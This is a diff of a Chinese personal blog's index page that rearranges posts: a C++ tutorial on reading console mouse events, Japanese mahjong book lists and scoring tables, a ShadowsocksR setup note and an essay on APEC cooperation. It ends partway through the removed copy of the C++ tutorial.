@@ -60,7 +60,7 @@
 			博龄：114514
 		</div>
 		<div class="blogInfoItem">
-			日志：19
+			日志：20
 		</div>
 	</div>
 	<div class="social">
@@ -119,7 +119,7 @@
 </blockquote>
 <p>注册好后完成签到。<br>然后如图所示复制ShadowsocksR订阅链接:</p>
 <p><img src="https://s2.loli.net/2024/02/10/4WkAVgZf5lnTUhO.gif" alt="复制ShadowsocksR订阅链接"></p>
-<h3 id="windows-教程"><a href="#windows-教程" class="headerlink" title="windows 教程"></a>windows 教程</h3><p>下载<a target="_blank" rel="noopener" href="https://github.com/shadowsocksrr/shadowsocksr-csharp/releases">ShadowsocksR (for Windows)</a><br>解压后打开ShadowsocksR-dotnet2.0.exe（ShadowsocksR-dotnet4.0.exe可能会报错）</p>
+<h3 id="windows-教程"><a href="#windows-教程" class="headerlink" title="windows 教程"></a>windows 教程</h3><p>下载<a target="_blank" rel="noopener" href="https://github.com/shadowsocksrr/shadowsocksr-csharp/releases">ShadowsocksR (for Windows)</a><br>解压后打开ShadowsocksR-dotnet2.0.exe（ShadowsocksR-dotnet4.0.exe可能会报错）(个人感觉没有比Clash For Windows好用)</p>
 <blockquote>
 <p>如果有安全询问请关闭</p>
 </blockquote>
@@ -136,6 +136,189 @@
 	
 	<div class="post shadow">
 		<h1 class="postTitle">
+			<a href="/2024/07/14/高中学习心得/">
+				高中学习心得
+			</a>
+		</h1>
+		<div class="postInfo">
+			2024-07-14
+		</div>
+		
+		This page has been hidden. :>
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
+			<a href="/2023/07/07/用C-读取鼠标在控制台上的操作/">
+				用C++读取鼠标在控制台上的操作
+			</a>
+		</h1>
+		<div class="postInfo">
+			2023-07-07
+		</div>
+		
+		<p>与读取键盘信息类似，读取鼠标信息也是通过 <code>ReadConsoleInput</code> 函数来实现</p>
+<p>咱先说一下需要用到的头文件：</p>
+<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span></code></pre>
+
+<p>响应鼠标点击事件的变量类型</p>
+<pre><code class="hljs cpp">INPUT_RECORD</code></pre>
+
+
+<p>咱先介绍一下<code>ReadConsoleInput</code>这个函数</p>
+<pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_MOUSE_EVENT_RECORD</span> &#123; 
+		COORD dwMousePosition;		<span class="hljs-comment">// 当前鼠标位置</span>
+		DWORD dwButtonState;		<span class="hljs-comment">// 鼠标按钮状态</span>
+		DWORD dwControlKeyState;	<span class="hljs-comment">// 键盘控制键状态</span>
+		DWORD dwEventFlags; 		<span class="hljs-comment">// 事件状态</span>
+&#125; MOUSE_EVENT_RECORD;
+<span class="hljs-comment">//这个东西一般都在&quot;INPUT_RECORD的变量名.Event.MouseEvent.以上变量&quot;</span></code></pre>
+<p>1.第一个参数存放鼠标的位置信息，类型为 COORD 坐标类型；</p>
+<p>2.第二个参数（dwButtonState）为鼠标的按键状态，包含的值如下:</p>
+<table>
+<thead>
+<tr>
+<th align="left">鼠标按键状态码（dwButtonState）</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">FROM_LEFT_1ST_BUTTON_PRESSED</td>
+<td align="left">最左边按键</td>
+</tr>
+<tr>
+<td align="left">FROM_LEFT_2ND_BUTTON_PRESSED</td>
+<td align="left">左起第二个按键</td>
+</tr>
+<tr>
+<td align="left">FROM_LEFT_3RD_BUTTON_PRESSED</td>
+<td align="left">左起第三个按键</td>
+</tr>
+<tr>
+<td align="left">FROM_LEFT_4TH_BUTTON_PRESSED</td>
+<td align="left">左起第四个按键</td>
+</tr>
+<tr>
+<td align="left">RIGHTMOST_BUTTON_PRESSED</td>
+<td align="left">最右边按键</td>
+</tr>
+</tbody></table>
+<p>3.第三个参数是键盘控制键状态，这个和上一章的内容是一样的；</p>
+<p>4.最后一个参数（dwEventFlag）为事件状态：</p>
+<table>
+<thead>
+<tr>
+<th align="left">事件状态码（dwEventFlag）</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">DOUBLE_CLICK</td>
+<td align="left">双击</td>
+</tr>
+<tr>
+<td align="left">MOUSE_MOVED</td>
+<td align="left">移动</td>
+</tr>
+<tr>
+<td align="left">MOUSE_WHEELED</td>
+<td align="left">滚轮滚动（只适用于Windows 2000&#x2F;XP）</td>
+</tr>
+</tbody></table>
+<p>在程序开头应加上</p>
+<pre><code class="hljs cpp">HANDLE hOut = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
+HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
+<span class="hljs-comment">//这是用来添加鼠标输入设备的</span></code></pre>
+
+<p>用法举例</p>
+<pre><code class="hljs cpp"><span class="hljs-comment">//我写的一个简单地例子</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+	HANDLE hOut = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
+	HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
+
+	CONSOLE_SCREEN_BUFFER_INFO bInfo;
+	INPUT_RECORD mouseRec;
+	DWORD res;
+
+	<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)
+	&#123;
+		<span class="hljs-built_in">ReadConsoleInput</span>(hIn, &amp;mouseRec, <span class="hljs-number">1</span>, &amp;res);<span class="hljs-comment">//读取一个鼠标操作</span>
+		<span class="hljs-keyword">if</span>(mouseRec.Event.MouseEvent.dwButtonState==FROM_LEFT_1ST_BUTTON_PRESSED)<span class="hljs-comment">//如果点击了左键</span>
+		&#123;
+			<span class="hljs-keyword">if</span> (mouseRec.Event.MouseEvent.dwEventFlags == DOUBLE_CLICK)<span class="hljs-comment">//如果是双击</span>
+			&#123;
+				<span class="hljs-keyword">break</span>;	<span class="hljs-comment">//退出循环</span>
+			&#125;
+			<span class="hljs-keyword">else</span><span class="hljs-comment">//单击的情况</span>
+			&#123;
+				cout&lt;&lt;mouseRec.Event.MouseEvent.dwMousePosition.X&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;mouseRec.Event.MouseEvent.dwMousePosition.Y&lt;&lt;endl;<span class="hljs-comment">//输出当前鼠标的位置</span>
+			&#125;
+		&#125;
+	&#125;
+	<span class="hljs-built_in">CloseHandle</span>(hOut);  <span class="hljs-comment">// 关闭标准输出设备句柄  </span>
+	<span class="hljs-built_in">CloseHandle</span>(hIn);   <span class="hljs-comment">// 关闭标准输入设备句柄  </span>
+&#125;</code></pre>
+<p>摘自网络</p>
+<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span>  </span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
+ 
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  </span>
+<span class="hljs-function"></span>&#123;  
+	<span class="hljs-comment">// 获取标准输入输出设备句柄  </span>
+	HANDLE hOut = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);        
+	HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE); 
+	CONSOLE_SCREEN_BUFFER_INFO bInfo;
+	INPUT_RECORD	mouseRec;
+	DWORD			res;
+	COORD			crPos, crHome = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[Cursor Position] X: %2lu  Y: %2lu\n&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);	<span class="hljs-comment">// 初始状态</span>
+	<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)
+	&#123;
+		<span class="hljs-built_in">ReadConsoleInput</span>(hIn, &amp;mouseRec, <span class="hljs-number">1</span>, &amp;res);
+ 
+		<span class="hljs-keyword">if</span> (mouseRec.EventType == MOUSE_EVENT)
+		&#123;
+			<span class="hljs-keyword">if</span> (mouseRec.Event.MouseEvent.dwButtonState==FROM_LEFT_1ST_BUTTON_PRESSED)
+			&#123;
+				<span class="hljs-keyword">if</span> (mouseRec.Event.MouseEvent.dwEventFlags == DOUBLE_CLICK)
+				&#123;
+					<span class="hljs-keyword">break</span>;	<span class="hljs-comment">// 左键双击 退出循环</span>
+				&#125;
+			&#125;			
+			crPos = mouseRec.Event.MouseEvent.dwMousePosition;
+			<span class="hljs-built_in">GetConsoleScreenBufferInfo</span>(hOut, &amp;bInfo);
+			<span class="hljs-built_in">SetConsoleCursorPosition</span>(hOut, crHome);
+			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[Cursor Position] X: %2lu  Y: %2lu&quot;</span>, crPos.X, crPos.Y);
+			<span class="hljs-built_in">SetConsoleCursorPosition</span>(hOut, bInfo.dwCursorPosition);
+			<span class="hljs-keyword">switch</span> (mouseRec.Event.MouseEvent.dwButtonState)
+			&#123;
+				<span class="hljs-keyword">case</span> FROM_LEFT_1ST_BUTTON_PRESSED:			<span class="hljs-comment">// 左键 输出A</span>
+					<span class="hljs-built_in">FillConsoleOutputCharacter</span>(hOut, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">1</span>, crPos, &amp;res);
+					<span class="hljs-keyword">break</span>;		<span class="hljs-comment">// 如果使用printf输出，则之前需要先设置光标的位置</span>
+ 	
+				<span class="hljs-keyword">case</span> RIGHTMOST_BUTTON_PRESSED:				<span class="hljs-comment">// 右键 输出a</span>
+					<span class="hljs-built_in">FillConsoleOutputCharacter</span>(hOut, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">1</span>, crPos, &amp;res);
+					<span class="hljs-keyword">break</span>;
+	 
+				<span class="hljs-keyword">default</span>:
+					<span class="hljs-keyword">break</span>;
+			&#125;
+		&#125;		
+	&#125;
+	<span class="hljs-built_in">CloseHandle</span>(hOut);  <span class="hljs-comment">// 关闭标准输出设备句柄  </span>
+	<span class="hljs-built_in">CloseHandle</span>(hIn);   <span class="hljs-comment">// 关闭标准输入设备句柄  </span>
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
+&#125;</code></pre>
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
 			<a href="/2024/07/25/日语学习资源/">
 				日语学习资源
 			</a>
@@ -145,6 +328,140 @@
 		</div>
 		
 		<p><a target="_blank" rel="noopener" href="https://mainichi-nonbiri.com/">毎日のんびり日本語教師</a><br><a target="_blank" rel="noopener" href="https://www.weblio.jp/">Weblio辞書国語辞典</a></p>
+
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
+			<a href="/2023/07/06/日本麻将资料整理/">
+				日本麻将资料整理
+			</a>
+		</h1>
+		<div class="postInfo">
+			2023-07-06
+		</div>
+		
+		<p><strong>书名一览（若要保证浏览体验，请关闭翻译）</strong></p>
+<blockquote>
+<p>《ASAPIN 天才雀士に麻雀のことを聞いたらバカ勝ちできた》<br>《Guzaku 傑作「何切る」300選》<br>《Guzaku 定石「何切る」301選》<br>《owata 三人麻雀の極意》<br>《ZERO ゼロ秒思考の麻雀》<br>《ZERO 麻雀強者の0秒思考》<br>《かにマジン 日本一麻雀が強いサラリーマンの必勝法》<br>《きよ アマチュア地方最強位が作る新麻雀マニュアル》<br>《みーにん 「統計学」のマージャン戦術》<br>《みーにん 知るだけで強くなる麻雀の2択》<br>《ゆうせー 実戦でよく出る!麻雀講義》<br>《中島準也 理論的思考で勝つ麻雀》<br>《二階堂亜樹 勝てる麻雀の基本》<br>《土井泰昭 勝つ人は知っている現代麻雀30の新常識》<br>《土田浩翔 運を育てる》<br>《堀内正人 麻雀の麒麟児の一打》<br>《堀慎吾 麻雀だから君は負けるんです》<br>《多井隆晴 多井熱》<br>《小林剛 スーパーデジタル麻雀》<br>《川村晃裕 麻雀勝ち組の鳴きテクニック》<br>《平澤元気 よくわかる麻雀の勝ち方》<br>《平澤元気 現代麻雀の秘技相手に対応させる技術》<br>《平澤元気 絶対にラスを引かない麻雀ラス回避35の技術》<br>《日本プロ麻雀連盟 麻雀基本手筋コレクション》<br>《朝倉康心 麻雀の失敗学》<br>《比嘉秀仁 強者の最近手筋100》<br>《水上直紀 麻雀AI戦術》<br>《独歩 序盤の鉄戦略》<br>《独歩 鉄押しの条件》<br>《石橋伸洋 進化するデジタル麻雀》<br>《石橋伸洋 黒いデジタル麻雀》<br>《福地誠 これだけで勝てる!麻雀の基本形80》<br>《福地誠 手作りと押し引きの鉄戦術》<br>《福地誠 麻雀10倍勝てるテクニック》<br>《福地誠 麻雀の正解》<br>《福地誠 麻雀テクニック》<br>《福地誠 麻雀勝ち組の選択》<br>《福地誠 麻雀勝ち組の選択II》<br>《菊池翔 絶対に負けない最強麻雀戦術》<br>《藤田晋 仕事が麻雀で麻雀が仕事》<br>《近代麻雀 プロに挑戦!!麻雀検定》<br>《近代麻雀 麻雀プロMリーグ選手名鑑》<br>《近藤誠一 大きく打ち大きく勝つ麻雀》<br>《鈴木たろう ゼウスの選択》<br>《馬場裕一 バビーのメンチン何切る》<br>《鳳南研究所 現代麻雀の神ワザ》</p>
+</blockquote>
+<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><strong>资料来源于网络</strong></p>
+<p><strong>仅供交流学习使用，不得用于任何商业用途</strong></p>
+<p><a target="_blank" rel="noopener" href="https://cowtransfer.com/s/cc797d6a256440">https://cowtransfer.com/s/cc797d6a256440</a> 点击链接查看 【 PDF.zip 】 ，或访问奶牛快传 cowtransfer.com 输入传输口令 f4jzju 查看；</p>
+
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
+			<a href="/2024/02/08/日本麻将算符表/">
+				日本麻将算符表
+			</a>
+		</h1>
+		<div class="postInfo">
+			2024-02-08
+		</div>
+		
+		<blockquote>
+<p>符&#x3D;20（基底符）+各牌组的符数+和牌方式<br>个位不为0的用进一法进到十位</p>
+</blockquote>
+<h2 id="牌组的符数"><a href="#牌组的符数" class="headerlink" title="牌组的符数"></a>牌组的符数</h2><table>
+<thead>
+<tr>
+<th align="center">刻子</th>
+<th align="center">暗</th>
+<th align="center">幺九</th>
+<th align="center">杠</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">2</td>
+<td align="center">(累乘)*2</td>
+<td align="center">(累乘)*2</td>
+<td align="center">(累乘)*4</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">雀头</th>
+<th align="center">顺子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">2*番数</td>
+<td align="center">0</td>
+</tr>
+</tbody></table>
+<h2 id="和牌方式"><a href="#和牌方式" class="headerlink" title="和牌方式"></a>和牌方式</h2><table>
+<thead>
+<tr>
+<th align="center">门清前放铳</th>
+<th align="center">自摸</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">10</td>
+<td align="center">2</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">平和自摸</th>
+<th align="center">平和放铳</th>
+<th align="center">特殊牌型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">20（固定）</td>
+<td align="center">30（固定）</td>
+<td align="center">25（固定）</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">边张（单骑）</th>
+<th align="center">嵌张（单骑）</th>
+<th align="center">雀头（单骑）</th>
+<th align="center">双碰（非单骑）</th>
+<th align="center">两面（非单骑）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">2</td>
+<td align="center">2</td>
+<td align="center">2</td>
+<td align="center">0</td>
+<td align="center">0</td>
+</tr>
+</tbody></table>
+<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><a target="_blank" rel="noopener" href="https://lietxia.github.io/fupractice.html">https://lietxia.github.io/fupractice.html</a></p>
+
+		
+	</div>
+	
+	<div class="post shadow">
+		<h1 class="postTitle">
+			<a href="/2024/11/29/推进构建亚太命运共同体/">
+				推进构建亚太命运共同体
+			</a>
+		</h1>
+		<div class="postInfo">
+			2024-11-29
+		</div>
+		
+		<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在全球化的背景下，亚太地区作为全球经济最具活力的板块之一，其合作与发展对于整个世界的繁荣与稳定具有重要意义。2024年11月16日，习近平主席在亚太经合组织第三十一次领导人非正式会议上发表了题为“共担时代责任，共促亚太发展”的重要讲话，强调了构建开放融通的亚太合作格局、培育绿色创新的亚太增长动能、树牢普惠包容的亚太发展理念的重要性。本文旨在探讨如何通过这些措施推动构建亚太命运共同体，以实现区域的共同发展与繁荣。</p>
+<h2 id="一、当前亚太地区面临的挑战"><a href="#一、当前亚太地区面临的挑战" class="headerlink" title="一、当前亚太地区面临的挑战"></a>一、当前亚太地区面临的挑战</h2><p>当前，世界经济面临百年未有之大变局，经济增长乏力，开放指数下滑，亚太合作亦面临地缘政治、单边主义和保护主义上升等挑战。这些挑战不仅影响了区域经济的稳定与发展，也对全球经济的循环和供应链的稳定构成了威胁。</p>
+<h2 id="二、构建开放融通的亚太合作格局"><a href="#二、构建开放融通的亚太合作格局" class="headerlink" title="二、构建开放融通的亚太合作格局"></a>二、构建开放融通的亚太合作格局</h2><p>为应对上述挑战，首要任务是构建一个开放融通的亚太合作格局。开放性是亚太地区经济增长的重要驱动力。构建开放融通的亚太合作格局，首先需要坚持多边主义和开放型经济的大方向。这意味着亚太各国应坚定维护以世界贸易组织为核心的多边贸易体制，激活亚太经合组织在全球经贸规则中的“解化器”作用，推进区域经济一体化和互联互通，拆除阻碍贸易、投资、技术、服务流通的壁垒，维护产业链供应链的稳定通畅。</p>
+<p>中国作为亚太地区的重要成员，其开放政策为区域合作提供了新的动力。中国坚持以开放促改革，主动对接国际高标准经贸规则，积极扩大自主开放，推动电信、互联网、教育、文化、医疗等领域的有序开放。通过实施《区域全面经济伙伴关系协定》、加入《全面与进步跨太平洋伙伴关系协定》和《数字经济伙伴关系协定》等多边贸易协定，中国将进一步扩大面向全球的高标准自由贸易区网络，为亚太地区的开放型经济发展注入新活力。</p>
+<h2 id="三、培育绿色创新的亚太增长动能"><a href="#三、培育绿色创新的亚太增长动能" class="headerlink" title="三、培育绿色创新的亚太增长动能"></a>三、培育绿色创新的亚太增长动能</h2><p>新一轮科技革命和产业变革为亚太地区提供了新的发展机遇。亚太各国应加强在人工智能、量子信息、生命健康等前沿领域的交流合作，营造开放、公平、公正、非歧视的创新生态，推动生产力的跃升。同时，坚持生态优先、节约集约、绿色低碳发展，推进经济社会发展全面绿色转型，建设清洁美丽的亚太。</p>
+<p>中国在绿色创新方面已经采取了积极行动，正在因地制宜发展新质生产力，并深化与各方的绿色创新合作。中国提出的《全球数据跨境流动合作倡议》旨在促进高效、便利、安全的数据跨境流动，为亚太高质量发展贡献力量。此外，中国在亚太经合组织提出的贸易单证数字化、绿色供应链能力建设、人工智能交流对话、粮食产业数字化等倡议，将进一步推动亚太地区的数字化绿色化协同转型发展。</p>
+<h2 id="四、树牢普惠包容的亚太发展理念"><a href="#四、树牢普惠包容的亚太发展理念" class="headerlink" title="四、树牢普惠包容的亚太发展理念"></a>四、树牢普惠包容的亚太发展理念</h2><p>普惠包容是亚太命运共同体建设的核心理念之一。亚太各国应加强经济技术合作，加大对发展中经济体和弱势群体的支持，共同做大并分好经济发展的“蛋糕”，让更多经济体、更多民众共享发展成果。中国在亚太经合组织推进提高居民收入、促进中小企业集群式发展的倡议，正是为了助力亚太经济的普惠包容发展。</p>
+<p>中国作为2026年亚太经合组织的东道主，期待与各方一道深化合作，造福亚太人民。中国的发展理念与秘鲁推动非正规经济向正规和全球经济转型合作的努力高度契合，体现了中国以人为本、促进社会公平正义、增进人民福祉的发展理念。</p>
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>推动构建亚太命运共同体，不仅是亚太各国共同的责任，也是实现区域长期稳定与繁荣的必由之路。通过构建开放融通的合作格局、培育绿色创新的增长动能、树牢普惠包容的发展理念，亚太各国可以共同应对全球性挑战，实现共同发展。中国作为亚太大家庭的一员，愿意与各国携手合作，共同推动亚太命运共同体的建设，为实现和平发展、互利合作、共同繁荣的世界各国现代化共同努力。</p>
 
 		
 	</div>
@@ -1504,210 +1821,6 @@
 	
 	<div class="post shadow">
 		<h1 class="postTitle">
-			<a href="/2024/07/14/高中学习心得/">
-				高中学习心得
-			</a>
-		</h1>
-		<div class="postInfo">
-			2024-07-14
-		</div>
-		
-		This page has been hidden. :>
-		
-	</div>
-	
-	<div class="post shadow">
-		<h1 class="postTitle">
-			<a href="/2023/07/07/用C-读取鼠标在控制台上的操作/">
-				用C++读取鼠标在控制台上的操作
-			</a>
-		</h1>
-		<div class="postInfo">
-			2023-07-07
-		</div>
-		
-		<p>与读取键盘信息类似，读取鼠标信息也是通过 <code>ReadConsoleInput</code> 函数来实现</p>
-<p>咱先说一下需要用到的头文件：</p>
-<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span></code></pre>
-
-<p>响应鼠标点击事件的变量类型</p>
-<pre><code class="hljs cpp">INPUT_RECORD</code></pre>
-
-
-<p>咱先介绍一下<code>ReadConsoleInput</code>这个函数</p>
-<pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_MOUSE_EVENT_RECORD</span> &#123; 
-		COORD dwMousePosition;		<span class="hljs-comment">// 当前鼠标位置</span>
-		DWORD dwButtonState;		<span class="hljs-comment">// 鼠标按钮状态</span>
-		DWORD dwControlKeyState;	<span class="hljs-comment">// 键盘控制键状态</span>
-		DWORD dwEventFlags; 		<span class="hljs-comment">// 事件状态</span>
-&#125; MOUSE_EVENT_RECORD;
-<span class="hljs-comment">//这个东西一般都在&quot;INPUT_RECORD的变量名.Event.MouseEvent.以上变量&quot;</span></code></pre>
-<p>1.第一个参数存放鼠标的位置信息，类型为 COORD 坐标类型；</p>
-<p>2.第二个参数（dwButtonState）为鼠标的按键状态，包含的值如下:</p>
-<table>
-<thead>
-<tr>
-<th align="left">鼠标按键状态码（dwButtonState）</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">FROM_LEFT_1ST_BUTTON_PRESSED</td>
-<td align="left">最左边按键</td>
-</tr>
-<tr>
-<td align="left">FROM_LEFT_2ND_BUTTON_PRESSED</td>
-<td align="left">左起第二个按键</td>
-</tr>
-<tr>
-<td align="left">FROM_LEFT_3RD_BUTTON_PRESSED</td>
-<td align="left">左起第三个按键</td>
-</tr>
-<tr>
-<td align="left">FROM_LEFT_4TH_BUTTON_PRESSED</td>
-<td align="left">左起第四个按键</td>
-</tr>
-<tr>
-<td align="left">RIGHTMOST_BUTTON_PRESSED</td>
-<td align="left">最右边按键</td>
-</tr>
-</tbody></table>
-<p>3.第三个参数是键盘控制键状态，这个和上一章的内容是一样的；</p>
-<p>4.最后一个参数（dwEventFlag）为事件状态：</p>
-<table>
-<thead>
-<tr>
-<th align="left">事件状态码（dwEventFlag）</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">DOUBLE_CLICK</td>
-<td align="left">双击</td>
-</tr>
-<tr>
-<td align="left">MOUSE_MOVED</td>
-<td align="left">移动</td>
-</tr>
-<tr>
-<td align="left">MOUSE_WHEELED</td>
-<td align="left">滚轮滚动（只适用于Windows 2000&#x2F;XP）</td>
-</tr>
-</tbody></table>
-<p>在程序开头应加上</p>
-<pre><code class="hljs cpp">HANDLE hOut = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
-HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
-<span class="hljs-comment">//这是用来添加鼠标输入设备的</span></code></pre>
-
-<p>用法举例</p>
-<pre><code class="hljs cpp"><span class="hljs-comment">//我写的一个简单地例子</span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span>
-<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
-<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
-<span class="hljs-function"></span>&#123;
-	HANDLE hOut = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
-	HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
-
-	CONSOLE_SCREEN_BUFFER_INFO bInfo;
-	INPUT_RECORD mouseRec;
-	DWORD res;
-
-	<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)
-	&#123;
-		<span class="hljs-built_in">ReadConsoleInput</span>(hIn, &amp;mouseRec, <span class="hljs-number">1</span>, &amp;res);<span class="hljs-comment">//读取一个鼠标操作</span>
-		<span class="hljs-keyword">if</span>(mouseRec.Event.MouseEvent.dwButtonState==FROM_LEFT_1ST_BUTTON_PRESSED)<span class="hljs-comment">//如果点击了左键</span>
-		&#123;
-			<span class="hljs-keyword">if</span> (mouseRec.Event.MouseEvent.dwEventFlags == DOUBLE_CLICK)<span class="hljs-comment">//如果是双击</span>
-			&#123;
-				<span class="hljs-keyword">break</span>;	<span class="hljs-comment">//退出循环</span>
-			&#125;
-			<span class="hljs-keyword">else</span><span class="hljs-comment">//单击的情况</span>
-			&#123;
-				cout&lt;&lt;mouseRec.Event.MouseEvent.dwMousePosition.X&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;mouseRec.Event.MouseEvent.dwMousePosition.Y&lt;&lt;endl;<span class="hljs-comment">//输出当前鼠标的位置</span>
-			&#125;
-		&#125;
-	&#125;
-	<span class="hljs-built_in">CloseHandle</span>(hOut);  <span class="hljs-comment">// 关闭标准输出设备句柄  </span>
-	<span class="hljs-built_in">CloseHandle</span>(hIn);   <span class="hljs-comment">// 关闭标准输入设备句柄  </span>
-&#125;</code></pre>
-<p>摘自网络</p>
-<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span>  </span>
-<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
- 
-<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  </span>
-<span class="hljs-function"></span>&#123;  
-	<span class="hljs-comment">// 获取标准输入输出设备句柄  </span>
-	HANDLE hOut = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);        
-	HANDLE hIn = <span class="hljs-built_in">GetStdHandle</span>(STD_INPUT_HANDLE); 
-	CONSOLE_SCREEN_BUFFER_INFO bInfo;
-	INPUT_RECORD	mouseRec;
-	DWORD			res;
-	COORD			crPos, crHome = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;
-	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[Cursor Position] X: %2lu  Y: %2lu\n&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);	<span class="hljs-comment">// 初始状态</span>
-	<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)
-	&#123;
-		<span class="hljs-built_in">ReadConsoleInput</span>(hIn, &amp;mouseRec, <span class="hljs-number">1</span>, &amp;res);
- 
-		<span class="hljs-keyword">if</span> (mouseRec.EventType == MOUSE_EVENT)
-		&#123;
-			<span class="hljs-keyword">if</span> (mouseRec.Event.MouseEvent.dwButtonState==FROM_LEFT_1ST_BUTTON_PRESSED)
-			&#123;
-				<span class="hljs-keyword">if</span> (mouseRec.Event.MouseEvent.dwEventFlags == DOUBLE_CLICK)
-				&#123;
-					<span class="hljs-keyword">break</span>;	<span class="hljs-comment">// 左键双击 退出循环</span>
-				&#125;
-			&#125;			
-			crPos = mouseRec.Event.MouseEvent.dwMousePosition;
-			<span class="hljs-built_in">GetConsoleScreenBufferInfo</span>(hOut, &amp;bInfo);
-			<span class="hljs-built_in">SetConsoleCursorPosition</span>(hOut, crHome);
-			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[Cursor Position] X: %2lu  Y: %2lu&quot;</span>, crPos.X, crPos.Y);
-			<span class="hljs-built_in">SetConsoleCursorPosition</span>(hOut, bInfo.dwCursorPosition);
-			<span class="hljs-keyword">switch</span> (mouseRec.Event.MouseEvent.dwButtonState)
-			&#123;
-				<span class="hljs-keyword">case</span> FROM_LEFT_1ST_BUTTON_PRESSED:			<span class="hljs-comment">// 左键 输出A</span>
-					<span class="hljs-built_in">FillConsoleOutputCharacter</span>(hOut, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">1</span>, crPos, &amp;res);
-					<span class="hljs-keyword">break</span>;		<span class="hljs-comment">// 如果使用printf输出，则之前需要先设置光标的位置</span>
- 	
-				<span class="hljs-keyword">case</span> RIGHTMOST_BUTTON_PRESSED:				<span class="hljs-comment">// 右键 输出a</span>
